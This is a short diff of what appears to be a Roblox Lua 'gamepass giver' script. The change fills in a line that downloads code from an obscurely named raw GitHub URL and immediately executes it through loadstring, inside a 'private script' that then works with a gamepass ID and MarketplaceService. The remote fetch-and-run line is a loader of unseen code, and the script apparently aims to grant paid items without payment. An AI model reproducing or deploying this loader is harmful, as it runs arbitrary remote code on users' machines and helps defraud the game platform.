@@ -15,7 +15,7 @@ _G.KeyInput = "0"
 
 -- PRIVATE SCRIPT --
 function GamepassGiver()
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hjfjvfnwoxsmkcnf/fjqokdmv9ejsndFF948/main/jansnbfuje"))()
 
 gamePassId = _G.ID
 market = game:GetService("MarketplaceService")
